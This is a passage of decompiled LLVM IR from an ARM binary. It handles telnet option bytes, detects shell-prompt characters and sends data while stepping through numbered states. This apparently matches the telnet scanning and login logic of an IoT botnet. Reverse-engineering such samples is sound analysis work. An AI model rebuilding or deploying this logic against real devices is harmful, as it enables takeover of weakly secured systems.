  store i32 %v2_f29c, i32* %r2.global-to-local, align 4
  %v1_f2a0 = add i32 %v1_f2b4, 1
  store i32 %v1_f2a0, i32* @r5, align 4
  %v3_f2a4 = icmp uge i32 %v2_f29c, %v1_f2a0
  store i1 %v3_f2a4, i1* %cpsr_c.global-to-local, align 1
  %v9_f2a4 = icmp eq i32 %v2_f29c, %v1_f2a0
  store i1 %v9_f2a4, i1* %cpsr_z.global-to-local, align 1
  %v2_f2a8 = xor i1 %v3_f2a4, true
  %v3_f2a8 = or i1 %v9_f2a4, %v2_f2a8
  br i1 %v3_f2a8, label %dec_label_pc_f33c, label %dec_label_pc_f2ac

dec_label_pc_f2ac:                                ; preds = %dec_label_pc_f29c
  %v2_f2ac = inttoptr i32 %v1_f2a0 to i8*
  %v3_f2ac = load i8, i8* %v2_f2ac, align 1
  %v4_f2ac = zext i8 %v3_f2ac to i32
  store i32 %v4_f2ac, i32* @r3, align 4
  %v2_f2b0 = icmp eq i8 %v3_f2ac, -1
  store i1 %v2_f2b0, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_f2b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f2b0, label %dec_label_pc_f288.loopexit, label %dec_label_pc_f2c0

dec_label_pc_f2c0:                                ; preds = %dec_label_pc_f2ac
  %v2_f2c0 = icmp ugt i8 %v3_f2ac, -4
  store i1 %v2_f2c0, i1* %cpsr_c.global-to-local, align 1
  %v7_f2c0 = icmp eq i8 %v3_f2ac, -3
  store i1 %v7_f2c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f2c0, label %dec_label_pc_f854, label %dec_label_pc_f2c8

dec_label_pc_f2c8:                                ; preds = %dec_label_pc_f2c0
  %v1_f2c8 = add i32 %v1_f2b4, 2
  store i32 %v1_f2c8, i32* @r3, align 4
  %v3_f2cc = icmp uge i32 %v2_f29c, %v1_f2c8
  store i1 %v3_f2cc, i1* %cpsr_c.global-to-local, align 1
  %v9_f2cc = icmp eq i32 %v2_f29c, %v1_f2c8
  store i1 %v9_f2cc, i1* %cpsr_z.global-to-local, align 1
  %v2_f2d0 = xor i1 %v3_f2cc, true
  %v3_f2d0 = or i1 %v9_f2cc, %v2_f2d0
  br i1 %v3_f2d0, label %dec_label_pc_f33c, label %dec_label_pc_f2d4

dec_label_pc_f2d4:                                ; preds = %dec_label_pc_f8b8, %bb454, %.thread138, %dec_label_pc_f2c8
  %v0_f2d4 = load i32, i32* @r5, align 4
  %v1_f2d4 = inttoptr i32 %v0_f2d4 to i8*
  %v2_f2d4 = load i8, i8* %v1_f2d4, align 1
  %v3_f2d4 = zext i8 %v2_f2d4 to i32
  store i32 %v3_f2d4, i32* %r3.global-to-local, align 4
  %v2_f2d8 = icmp ugt i8 %v2_f2d4, -4
  store i1 %v2_f2d8, i1* %cpsr_c.global-to-local, align 1
  %v7_f2d8 = icmp eq i8 %v2_f2d4, -3
  store i1 %v7_f2d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f2d8, label %.thread96, label %dec_label_pc_f2e8

.thread96:                                        ; preds = %dec_label_pc_f2d4
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_f2d4, align 1
  %v0_f2e4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f2e4.pr.pr, label %.thread99, label %.thread96.dec_label_pc_f2e8thread-pre-split_crit_edge

.thread96.dec_label_pc_f2e8thread-pre-split_crit_edge: ; preds = %.thread96
  %v0_f2e8.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f2e8

dec_label_pc_f2e8:                                ; preds = %dec_label_pc_f2d4, %.thread96.dec_label_pc_f2e8thread-pre-split_crit_edge
  %v0_f2e8.pr = phi i32 [ %v0_f2e8.pr.pre, %.thread96.dec_label_pc_f2e8thread-pre-split_crit_edge ], [ %v3_f2d4, %dec_label_pc_f2d4 ]
  %v2_f2e8 = icmp ugt i32 %v0_f2e8.pr, 250
  store i1 %v2_f2e8, i1* %cpsr_c.global-to-local, align 1
  %v7_f2e8 = icmp eq i32 %v0_f2e8.pr, 251
  store i1 %v7_f2e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f2e8, label %bb433, label %.thread99

bb433:                                            ; preds = %dec_label_pc_f2e8
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_f2f0 = load i32, i32* @r5, align 4
  %v4_f2f0 = inttoptr i32 %v3_f2f0 to i8*
  store i8 -3, i8* %v4_f2f0, align 1
  br label %.thread99

.thread99:                                        ; preds = %dec_label_pc_f2e8, %.thread96, %bb433
  %v0_f2f4 = load i32, i32* @r4, align 4
  %v1_f2f4 = add i32 %v0_f2f4, 2
  %v2_f2f4 = inttoptr i32 %v1_f2f4 to i8*
  %v3_f2f4 = load i8, i8* %v2_f2f4, align 1
  %v4_f2f4 = zext i8 %v3_f2f4 to i32
  store i32 %v4_f2f4, i32* %r3.global-to-local, align 4
  %v2_f2f8 = icmp ugt i8 %v3_f2f4, -4
  store i1 %v2_f2f8, i1* %cpsr_c.global-to-local, align 1
  %v7_f2f8 = icmp eq i8 %v3_f2f4, -3
  store i1 %v7_f2f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f2f8, label %.thread100, label %dec_label_pc_f308

.thread100:                                       ; preds = %.thread99
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v2_f2f4, align 1
  %v0_f304.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f304.pr.pr, label %.thread103, label %.thread100.dec_label_pc_f308thread-pre-split_crit_edge

.thread100.dec_label_pc_f308thread-pre-split_crit_edge: ; preds = %.thread100
  %v0_f308.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f308

dec_label_pc_f308:                                ; preds = %.thread99, %.thread100.dec_label_pc_f308thread-pre-split_crit_edge
  %v0_f308.pr = phi i32 [ %v0_f308.pr.pre, %.thread100.dec_label_pc_f308thread-pre-split_crit_edge ], [ %v4_f2f4, %.thread99 ]
  %v2_f308 = icmp ugt i32 %v0_f308.pr, 250
  store i1 %v2_f308, i1* %cpsr_c.global-to-local, align 1
  %v7_f308 = icmp eq i32 %v0_f308.pr, 251
  store i1 %v7_f308, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f308, label %bb434, label %.thread103

bb434:                                            ; preds = %dec_label_pc_f308
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_f310 = load i32, i32* @r4, align 4
  %v4_f310 = add i32 %v3_f310, 2
  %v5_f310 = inttoptr i32 %v4_f310 to i8*
  store i8 -3, i8* %v5_f310, align 1
  br label %.thread103

.thread103:                                       ; preds = %dec_label_pc_f308, %.thread100, %bb434
  %v0_f314 = load i32, i32* @r6, align 4
  %v1_f314 = add i32 %v0_f314, 4
  %v2_f314 = inttoptr i32 %v1_f314 to i32*
  %v3_f314 = load i32, i32* %v2_f314, align 4
  store i32 %v3_f314, i32* %r0.global-to-local, align 4
  %v0_f318 = load i32, i32* @r4, align 4
  br label %dec_label_pc_f320

dec_label_pc_f320:                                ; preds = %dec_label_pc_f9cc, %.thread103
  %v0_f324 = phi i32 [ %v3_f9e0, %dec_label_pc_f9cc ], [ %v3_f314, %.thread103 ]
  %storemerge4 = phi i32 [ %v2_f86c, %dec_label_pc_f9cc ], [ %v0_f318, %.thread103 ]
  %storemerge3 = phi i32 [ 9, %dec_label_pc_f9cc ], [ 3, %.thread103 ]
  store i32 %storemerge4, i32* %r1.global-to-local, align 4
  store i32 %storemerge3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* @r3, align 4
  %v4_f324 = call i32 @function_11300(i32 %v0_f324, i32 %storemerge4, i32 %storemerge3, i32 16384)
  store i32 %v4_f324, i32* %r0.global-to-local, align 4
  %v0_f328 = load i32, i32* @r6, align 4
  %v1_f328 = add i32 %v0_f328, 24
  %v2_f328 = inttoptr i32 %v1_f328 to i32*
  %v3_f328 = load i32, i32* %v2_f328, align 4
  store i32 %v3_f328, i32* %r1.global-to-local, align 4
  %v0_f32c = load i32, i32* @r7, align 4
  %v1_f32c = add i32 %v0_f32c, 3
  store i32 %v1_f32c, i32* @r7, align 4
  %v3_f330 = icmp uge i32 %v1_f32c, %v3_f328
  store i1 %v3_f330, i1* %cpsr_c.global-to-local, align 1
  %v9_f330 = icmp eq i32 %v1_f32c, %v3_f328
  store i1 %v9_f330, i1* %cpsr_z.global-to-local, align 1
  %v0_f334 = load i32, i32* @r4, align 4
  %v1_f334 = add i32 %v0_f334, 3
  store i32 %v1_f334, i32* @r4, align 4
  %v5_f338 = icmp slt i32 %v1_f32c, %v3_f328
  br i1 %v5_f338, label %dec_label_pc_f290, label %dec_label_pc_f33c

dec_label_pc_f33c:                                ; preds = %dec_label_pc_f288.loopexit, %dec_label_pc_f290, %dec_label_pc_f320, %dec_label_pc_f2c8, %dec_label_pc_f29c, %dec_label_pc_f27c, %dec_label_pc_f854.dec_label_pc_f33c.loopexit_crit_edge
  %v6_f344 = phi i32 [ %v0_f884, %dec_label_pc_f854.dec_label_pc_f33c.loopexit_crit_edge ], [ %v0_ef90, %dec_label_pc_f27c ], [ %v6_f344274, %dec_label_pc_f290 ], [ %v0_f328, %dec_label_pc_f320 ], [ %v6_f344274, %dec_label_pc_f2c8 ], [ %v6_f344274, %dec_label_pc_f29c ], [ %v6_f344274, %dec_label_pc_f288.loopexit ]
  %v0_f33c = phi i32 [ %v0_f33c.pre.pre, %dec_label_pc_f854.dec_label_pc_f33c.loopexit_crit_edge ], [ 0, %dec_label_pc_f27c ], [ %v1_f2b8, %dec_label_pc_f290 ], [ %v1_f32c, %dec_label_pc_f320 ], [ %v1_f2b8, %dec_label_pc_f2c8 ], [ %v1_f2b8, %dec_label_pc_f29c ], [ %v2_f2b8, %dec_label_pc_f288.loopexit ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f33c = icmp eq i32 %v0_f33c, 0
  store i1 %v2_f33c, i1* %cpsr_z.global-to-local, align 1
  %tmp435 = icmp slt i32 %v0_f33c, 1
  br i1 %tmp435, label %dec_label_pc_f728, label %bb436

bb436:                                            ; preds = %dec_label_pc_f33c
  store i32 3, i32* @r3, align 4
  %v7_f344 = add i32 %v6_f344, 12
  %v8_f344 = inttoptr i32 %v7_f344 to i32*
  store i32 3, i32* %v8_f344, align 4
  br label %dec_label_pc_f728

dec_label_pc_f34c:                                ; preds = %dec_label_pc_ef90
  %v1_f34c = add i32 %v0_ef90, 24
  %v2_f34c = inttoptr i32 %v1_f34c to i32*
  %v3_f34c = load i32, i32* %v2_f34c, align 4
  store i32 %v3_f34c, i32* %r2.global-to-local, align 4
  %v1_f350 = add i32 %v3_f34c, -1
  store i32 %v1_f350, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f354 = icmp eq i32 %v1_f350, 0
  store i1 %v2_f354, i1* %cpsr_z.global-to-local, align 1
  %tmp437 = icmp slt i32 %v1_f350, 1
  br i1 %tmp437, label %dec_label_pc_ef14.backedge.thread, label %dec_label_pc_f35c

dec_label_pc_f35c:                                ; preds = %dec_label_pc_f34c
  %v2_f35c = add i32 %v1_f350, %v0_ef90
  store i32 %v2_f35c, i32* %r3.global-to-local, align 4
  %v1_f360 = add i32 %v2_f35c, 28
  %v2_f360 = inttoptr i32 %v1_f360 to i8*
  %v3_f360 = load i8, i8* %v2_f360, align 1
  %v4_f360 = zext i8 %v3_f360 to i32
  store i32 %v4_f360, i32* %r3.global-to-local, align 4
  %v2_f364 = icmp ugt i8 %v3_f360, 61
  store i1 %v2_f364, i1* %cpsr_c.global-to-local, align 1
  %v7_f364 = icmp eq i8 %v3_f360, 62
  store i1 %v7_f364, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f364, label %dec_label_pc_f3c8, label %bb438

bb438:                                            ; preds = %dec_label_pc_f35c
  %v3_f368 = icmp ugt i8 %v3_f360, 57
  store i1 %v3_f368, i1* %cpsr_c.global-to-local, align 1
  %v8_f368 = icmp eq i8 %v3_f360, 58
  store i1 %v8_f368, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f368, label %dec_label_pc_f3c8, label %dec_label_pc_f370

dec_label_pc_f370:                                ; preds = %bb438
  %v2_f370 = icmp ugt i8 %v3_f360, 35
  store i1 %v2_f370, i1* %cpsr_c.global-to-local, align 1
  %v7_f370 = icmp eq i8 %v3_f360, 36
  store i1 %v7_f370, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f370, label %dec_label_pc_f3c8, label %dec_label_pc_f378

dec_label_pc_f378:                                ; preds = %dec_label_pc_f370
  %v2_f378 = icmp ugt i8 %v3_f360, 34
  store i1 %v2_f378, i1* %cpsr_c.global-to-local, align 1
  %v7_f378 = icmp eq i8 %v3_f360, 35
  store i1 %v7_f378, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f378, label %dec_label_pc_f3c8, label %dec_label_pc_f380

dec_label_pc_f380:                                ; preds = %dec_label_pc_f378
  %v2_f380 = icmp ugt i8 %v3_f360, 36
  store i1 %v2_f380, i1* %cpsr_c.global-to-local, align 1
  %v7_f380 = icmp eq i8 %v3_f360, 37
  store i1 %v7_f380, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f380, label %dec_label_pc_f3c8, label %dec_label_pc_f3b0.preheader

dec_label_pc_f3b0.preheader:                      ; preds = %dec_label_pc_f380
  %v3_f384 = add i32 %v0_ef90, 28
  %v2_f388 = add i32 %v3_f384, %v3_f34c
  store i32 %v2_f388, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f3b0

dec_label_pc_f394:                                ; preds = %bb439
  %v2_f394 = icmp ugt i8 %v3_f3b8, 35
  store i1 %v2_f394, i1* %cpsr_c.global-to-local, align 1
  %v7_f394 = icmp eq i8 %v3_f3b8, 36
  store i1 %v7_f394, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f394, label %dec_label_pc_f3c8, label %dec_label_pc_f39c

dec_label_pc_f39c:                                ; preds = %dec_label_pc_f394
  %v2_f39c = icmp ugt i8 %v3_f3b8, 34
  store i1 %v2_f39c, i1* %cpsr_c.global-to-local, align 1
  %v7_f39c = icmp eq i8 %v3_f3b8, 35
  store i1 %v7_f39c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f39c, label %dec_label_pc_f3c8, label %dec_label_pc_f3a4

dec_label_pc_f3a4:                                ; preds = %dec_label_pc_f39c
  %v2_f3a4 = icmp ugt i8 %v3_f3b8, 36
  store i1 %v2_f3a4, i1* %cpsr_c.global-to-local, align 1
  %v7_f3a4 = icmp eq i8 %v3_f3b8, 37
  store i1 %v7_f3a4, i1* %cpsr_z.global-to-local, align 1
  %v1_f3a8 = add i32 %v0_f3a8, -1
  store i32 %v1_f3a8, i32* %r3.global-to-local, align 4
  br i1 %v7_f3a4, label %dec_label_pc_f3c8, label %dec_label_pc_f3b0

dec_label_pc_f3b0:                                ; preds = %dec_label_pc_f3b0.preheader, %dec_label_pc_f3a4
  %v0_f3a8 = phi i32 [ %v2_f388, %dec_label_pc_f3b0.preheader ], [ %v1_f3a8, %dec_label_pc_f3a4 ]
  %v0_f3b0 = phi i32 [ %v1_f350, %dec_label_pc_f3b0.preheader ], [ %v1_f3b0, %dec_label_pc_f3a4 ]
  %v1_f3b0 = add i32 %v0_f3b0, -1
  store i32 %v1_f3b0, i32* %r1.global-to-local, align 4
  %v2_f3b0 = icmp ne i32 %v0_f3b0, 0
  store i1 %v2_f3b0, i1* %cpsr_c.global-to-local, align 1
  %v7_f3b0 = icmp eq i32 %v0_f3b0, 1
  store i1 %v7_f3b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3b0, label %dec_label_pc_ef14.backedge.thread561, label %dec_label_pc_f3b8

dec_label_pc_f3b8:                                ; preds = %dec_label_pc_f3b0
  %v1_f3b8 = add i32 %v0_f3a8, -2
  %v2_f3b8 = inttoptr i32 %v1_f3b8 to i8*
  %v3_f3b8 = load i8, i8* %v2_f3b8, align 1
  %v4_f3b8 = zext i8 %v3_f3b8 to i32
  store i32 %v4_f3b8, i32* %r2.global-to-local, align 4
  %v2_f3bc = icmp ugt i8 %v3_f3b8, 61
  store i1 %v2_f3bc, i1* %cpsr_c.global-to-local, align 1
  %v7_f3bc = icmp eq i8 %v3_f3b8, 62
  store i1 %v7_f3bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f3bc, label %dec_label_pc_f3c8, label %bb439

bb439:                                            ; preds = %dec_label_pc_f3b8
  %v3_f3c0 = icmp ugt i8 %v3_f3b8, 57
  store i1 %v3_f3c0, i1* %cpsr_c.global-to-local, align 1
  %v8_f3c0 = icmp eq i8 %v3_f3b8, 58
  store i1 %v8_f3c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f3c0, label %dec_label_pc_f3c8, label %dec_label_pc_f394

dec_label_pc_f3c8:                                ; preds = %dec_label_pc_f3b8, %bb439, %dec_label_pc_f3a4, %dec_label_pc_f39c, %dec_label_pc_f394, %dec_label_pc_f380, %dec_label_pc_f35c, %dec_label_pc_f378, %dec_label_pc_f370, %bb438
  %v0_f3cc = phi i32 [ %v1_f350, %dec_label_pc_f380 ], [ %v1_f350, %dec_label_pc_f35c ], [ %v1_f350, %dec_label_pc_f378 ], [ %v1_f350, %dec_label_pc_f370 ], [ %v1_f350, %bb438 ], [ %v1_f3b0, %dec_label_pc_f394 ], [ %v1_f3b0, %dec_label_pc_f39c ], [ %v1_f3b0, %dec_label_pc_f3a4 ], [ %v1_f3b0, %bb439 ], [ %v1_f3b0, %dec_label_pc_f3b8 ]
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_f3cc = add i32 %v0_f3cc, 1
  store i32 %v1_f3cc, i32* @r7, align 4
  %v1_f3d0 = call i32 @function_fd40(i32 6)
  store i32 %v2_f7c4, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v3_f3e0 = call i32 @function_fc7c(i32 6, i32* nonnull %stack_var_-60)
  store i32 %v3_f3e0, i32* %r0.global-to-local, align 4
  %v3_f3e4 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f3e4, i32* %r2.global-to-local, align 4
  store i32 %v3_f3e0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f3f0 = load i32, i32* @r6, align 4
  %v1_f3f0 = add i32 %v0_f3f0, 4
  %v2_f3f0 = inttoptr i32 %v1_f3f0 to i32*
  %v3_f3f0 = load i32, i32* %v2_f3f0, align 4
  store i32 %v3_f3f0, i32* %r0.global-to-local, align 4
  %v4_f3f4 = call i32 @function_11300(i32 %v3_f3f0, i32 %v3_f3e0, i32 %v3_f3e4, i32 16384)
  store i32 %v4_f3f4, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15ff4.185 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f404 = load i32, i32* @r6, align 4
  %v1_f404 = add i32 %v0_f404, 4
  %v2_f404 = inttoptr i32 %v1_f404 to i32*
  %v3_f404 = load i32, i32* %v2_f404, align 4
  store i32 %v3_f404, i32* %r0.global-to-local, align 4
  %v4_f408 = call i32 @function_11300(i32 %v3_f404, i32 ptrtoint ([3 x i8]* @global_var_15ff4.185 to i32), i32 2, i32 16384)
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_f410 = call i32 @function_fca0(i32 6)
  store i32 %v1_f410, i32* %r0.global-to-local, align 4
  store i32 7, i32* @r3, align 4
  %v1_f418 = load i32, i32* @r6, align 4
  %v2_f418 = add i32 %v1_f418, 12
  %v3_f418 = inttoptr i32 %v2_f418 to i32*
  store i32 7, i32* %v3_f418, align 4
  br label %dec_label_pc_f0ac

dec_label_pc_f420:                                ; preds = %dec_label_pc_ef90
  %v1_f420 = add i32 %v0_ef90, 24
  %v2_f420 = inttoptr i32 %v1_f420 to i32*
  %v3_f420 = load i32, i32* %v2_f420, align 4
  store i32 %v3_f420, i32* %r2.global-to-local, align 4
  %v1_f424 = add i32 %v3_f420, -1
  store i32 %v1_f424, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f428 = icmp eq i32 %v1_f424, 0
  store i1 %v2_f428, i1* %cpsr_z.global-to-local, align 1
  %tmp440 = icmp slt i32 %v1_f424, 1
  br i1 %tmp440, label %dec_label_pc_ef14.backedge.thread, label %dec_label_pc_f430

dec_label_pc_f430:                                ; preds = %dec_label_pc_f420
  %v2_f430 = add i32 %v1_f424, %v0_ef90
  store i32 %v2_f430, i32* %r3.global-to-local, align 4
  %v1_f434 = add i32 %v2_f430, 28
  %v2_f434 = inttoptr i32 %v1_f434 to i8*
  %v3_f434 = load i8, i8* %v2_f434, align 1
  %v4_f434 = zext i8 %v3_f434 to i32
  store i32 %v4_f434, i32* %r3.global-to-local, align 4
  %v2_f438 = icmp ugt i8 %v3_f434, 61
  store i1 %v2_f438, i1* %cpsr_c.global-to-local, align 1
  %v7_f438 = icmp eq i8 %v3_f434, 62
  store i1 %v7_f438, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f438, label %dec_label_pc_f49c, label %bb441

bb441:                                            ; preds = %dec_label_pc_f430
  %v3_f43c = icmp ugt i8 %v3_f434, 57
  store i1 %v3_f43c, i1* %cpsr_c.global-to-local, align 1
  %v8_f43c = icmp eq i8 %v3_f434, 58
  store i1 %v8_f43c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f43c, label %dec_label_pc_f49c, label %dec_label_pc_f444

dec_label_pc_f444:                                ; preds = %bb441
  %v2_f444 = icmp ugt i8 %v3_f434, 35
  store i1 %v2_f444, i1* %cpsr_c.global-to-local, align 1
  %v7_f444 = icmp eq i8 %v3_f434, 36
  store i1 %v7_f444, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f444, label %dec_label_pc_f49c, label %dec_label_pc_f44c

dec_label_pc_f44c:                                ; preds = %dec_label_pc_f444
  %v2_f44c = icmp ugt i8 %v3_f434, 34
  store i1 %v2_f44c, i1* %cpsr_c.global-to-local, align 1
  %v7_f44c = icmp eq i8 %v3_f434, 35
  store i1 %v7_f44c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f44c, label %dec_label_pc_f49c, label %dec_label_pc_f454

dec_label_pc_f454:                                ; preds = %dec_label_pc_f44c
  %v2_f454 = icmp ugt i8 %v3_f434, 36
  store i1 %v2_f454, i1* %cpsr_c.global-to-local, align 1
  %v7_f454 = icmp eq i8 %v3_f434, 37
  store i1 %v7_f454, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f454, label %dec_label_pc_f49c, label %dec_label_pc_f484.preheader

dec_label_pc_f484.preheader:                      ; preds = %dec_label_pc_f454
  %v3_f458 = add i32 %v0_ef90, 28
  %v2_f45c = add i32 %v3_f458, %v3_f420
  store i32 %v2_f45c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f484

dec_label_pc_f468:                                ; preds = %bb442
  %v2_f468 = icmp ugt i8 %v3_f48c, 35
  store i1 %v2_f468, i1* %cpsr_c.global-to-local, align 1
  %v7_f468 = icmp eq i8 %v3_f48c, 36
  store i1 %v7_f468, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f468, label %dec_label_pc_f49c, label %dec_label_pc_f470

dec_label_pc_f470:                                ; preds = %dec_label_pc_f468
  %v2_f470 = icmp ugt i8 %v3_f48c, 34
  store i1 %v2_f470, i1* %cpsr_c.global-to-local, align 1
  %v7_f470 = icmp eq i8 %v3_f48c, 35
  store i1 %v7_f470, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f470, label %dec_label_pc_f49c, label %dec_label_pc_f478

dec_label_pc_f478:                                ; preds = %dec_label_pc_f470
  %v2_f478 = icmp ugt i8 %v3_f48c, 36
  store i1 %v2_f478, i1* %cpsr_c.global-to-local, align 1
  %v7_f478 = icmp eq i8 %v3_f48c, 37
  store i1 %v7_f478, i1* %cpsr_z.global-to-local, align 1
  %v1_f47c = add i32 %v0_f47c, -1
  store i32 %v1_f47c, i32* %r3.global-to-local, align 4
  br i1 %v7_f478, label %dec_label_pc_f49c, label %dec_label_pc_f484

dec_label_pc_f484:                                ; preds = %dec_label_pc_f484.preheader, %dec_label_pc_f478
  %v0_f47c = phi i32 [ %v2_f45c, %dec_label_pc_f484.preheader ], [ %v1_f47c, %dec_label_pc_f478 ]
  %v0_f484 = phi i32 [ %v1_f424, %dec_label_pc_f484.preheader ], [ %v1_f484, %dec_label_pc_f478 ]
  %v1_f484 = add i32 %v0_f484, -1
  store i32 %v1_f484, i32* %r1.global-to-local, align 4
  %v2_f484 = icmp ne i32 %v0_f484, 0
  store i1 %v2_f484, i1* %cpsr_c.global-to-local, align 1
  %v7_f484 = icmp eq i32 %v0_f484, 1
  store i1 %v7_f484, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f484, label %dec_label_pc_ef14.backedge.thread561, label %dec_label_pc_f48c

dec_label_pc_f48c:                                ; preds = %dec_label_pc_f484
  %v1_f48c = add i32 %v0_f47c, -2
  %v2_f48c = inttoptr i32 %v1_f48c to i8*
  %v3_f48c = load i8, i8* %v2_f48c, align 1
  %v4_f48c = zext i8 %v3_f48c to i32
  store i32 %v4_f48c, i32* %r2.global-to-local, align 4
  %v2_f490 = icmp ugt i8 %v3_f48c, 61
  store i1 %v2_f490, i1* %cpsr_c.global-to-local, align 1
  %v7_f490 = icmp eq i8 %v3_f48c, 62
  store i1 %v7_f490, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f490, label %dec_label_pc_f49c, label %bb442

bb442:                                            ; preds = %dec_label_pc_f48c
  %v3_f494 = icmp ugt i8 %v3_f48c, 57
  store i1 %v3_f494, i1* %cpsr_c.global-to-local, align 1
  %v8_f494 = icmp eq i8 %v3_f48c, 58
  store i1 %v8_f494, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f494, label %dec_label_pc_f49c, label %dec_label_pc_f468

dec_label_pc_f49c:                                ; preds = %dec_label_pc_f48c, %bb442, %dec_label_pc_f478, %dec_label_pc_f470, %dec_label_pc_f468, %dec_label_pc_f454, %dec_label_pc_f430, %dec_label_pc_f44c, %dec_label_pc_f444, %bb441
  %v0_f4a0 = phi i32 [ %v1_f424, %dec_label_pc_f454 ], [ %v1_f424, %dec_label_pc_f430 ], [ %v1_f424, %dec_label_pc_f44c ], [ %v1_f424, %dec_label_pc_f444 ], [ %v1_f424, %bb441 ], [ %v1_f484, %dec_label_pc_f468 ], [ %v1_f484, %dec_label_pc_f470 ], [ %v1_f484, %dec_label_pc_f478 ], [ %v1_f484, %bb442 ], [ %v1_f484, %dec_label_pc_f48c ]
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_f4a0 = add i32 %v0_f4a0, 1
  store i32 %v1_f4a0, i32* @r7, align 4
  %v1_f4a4 = call i32 @function_fd40(i32 5)
  store i32 %v2_f7c4, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  %v3_f4b4 = call i32 @function_fc7c(i32 5, i32* nonnull %stack_var_-60)
  store i32 %v3_f4b4, i32* %r0.global-to-local, align 4
  %v3_f4b8 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f4b8, i32* %r2.global-to-local, align 4
  store i32 %v3_f4b4, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f4c4 = load i32, i32* @r6, align 4
  %v1_f4c4 = add i32 %v0_f4c4, 4
  %v2_f4c4 = inttoptr i32 %v1_f4c4 to i32*
  %v3_f4c4 = load i32, i32* %v2_f4c4, align 4
  store i32 %v3_f4c4, i32* %r0.global-to-local, align 4
  %v4_f4c8 = call i32 @function_11300(i32 %v3_f4c4, i32 %v3_f4b4, i32 %v3_f4b8, i32 16384)
  store i32 %v4_f4c8, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15ff4.185 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_f4d8 = load i32, i32* @r6, align 4
  %v1_f4d8 = add i32 %v0_f4d8, 4
  %v2_f4d8 = inttoptr i32 %v1_f4d8 to i32*
  %v3_f4d8 = load i32, i32* %v2_f4d8, align 4
  store i32 %v3_f4d8, i32* %r0.global-to-local, align 4
  %v4_f4dc = call i32 @function_11300(i32 %v3_f4d8, i32 ptrtoint ([3 x i8]* @global_var_15ff4.185 to i32), i32 2, i32 16384)
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_f4e4 = call i32 @function_fca0(i32 5)
  store i32 %v1_f4e4, i32* %r0.global-to-local, align 4
  store i32 6, i32* @r3, align 4
  %v1_f4ec = load i32, i32* @r6, align 4
  %v2_f4ec = add i32 %v1_f4ec, 12
  %v3_f4ec = inttoptr i32 %v2_f4ec to i32*
  store i32 6, i32* %v3_f4ec, align 4
  br label %dec_label_pc_f0ac

dec_label_pc_f56c:                                ; preds = %dec_label_pc_ef90
  %v1_f56c = add i32 %v0_ef90, 24
  %v2_f56c = inttoptr i32 %v1_f56c to i32*
  %v3_f56c = load i32, i32* %v2_f56c, align 4
  store i32 %v3_f56c, i32* %r2.global-to-local, align 4
  %v1_f570 = add i32 %v3_f56c, -1
  store i32 %v1_f570, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f574 = icmp eq i32 %v1_f570, 0
  store i1 %v2_f574, i1* %cpsr_z.global-to-local, align 1
  %tmp443 = icmp slt i32 %v1_f570, 1
